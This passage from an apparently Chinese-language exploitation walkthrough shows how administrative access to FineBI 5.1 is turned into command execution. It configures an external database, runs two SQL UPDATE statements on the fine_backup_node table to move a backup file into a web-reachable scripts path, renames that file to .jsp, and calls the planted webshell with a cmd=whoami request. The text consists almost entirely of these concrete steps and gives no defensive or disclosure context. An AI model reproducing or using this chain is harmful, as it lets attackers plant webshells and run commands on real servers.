现在就会有人问了，怎么才能连接数据库呢，不着急且听我慢慢道来，，在系统中有管理权限，可以配置外接数据库，只要有一台外网服务器，一个符合数据库版本和允许远程登录的数据库，不就成了么

#### 开始实现：

位置在:管理系统-系统管理-常规-外接数据库

![](../Images/175c2afcdf766e202daae71eb6ee8f0d.png)

![](../Images/42ab829718954a328e17c3867a381d82.png)

家境贫寒没有服务器，就找个我兄弟的服务用了一下，等下和他意思意思一下就可以了，现在说一下为什么要配置外接数据库，Finebi5.1 配置了外接，内容所有数据都会存入外接数据库当中，然后....手动滑稽

注意数据库版本是被指定的

![](../Images/bd44e48788754e01f62532de58613f92.png)

咳咳，回到正题，现在我们开始修改数据库内容，至于表怎么找到的，别问，问就是一个一个翻

> update fine\_backup\_node set backupName="col-0-dic" where backupName='2020.12.29\_10.11.24123';

> update fine\_backup\_node set savePath="../scripts/admin/db/T\_C162F2/super/P-1/S-1" where savePath='../backup/config/manual';

再次查看发现已经修改成功

![](../Images/7fcc1f70fae16cbbff338c24c80be19a.png)

这里说一下，为什么是把文件名改为 `col-0-dic`，而不是直接加上 `jsp`，因为它这个是会在指定的那个路径去寻找文件，如果改为 `col-0-dic.jsp` 就找不到文件了，所有现在就开始快乐的修改文件名环节

修改数据库后，回到系统后，刷新

![](../Images/68cd7f2d305d120fb628915d2f134c94.png)

可以看到文件名已经修改，现在开始重命名添加上 jsp 后缀

![](../Images/7b3c0a9668e9dde0cec9f472abb086bd.png)

保存，到主机上查看

![](../Images/9bd8c0c1ddb81ee40f78ba009493db80.png)

发现已经被修改，访问执行 whoami，参数是 cmd，GET 请求

> IP:端口/webroot/scripts/admin/db/T\_C162F2/super/P-1/S-1/col-0-dic.jsp?cmd=whoami

![](../Images/be61718dc4839febf08cf59d0131f49c.png)
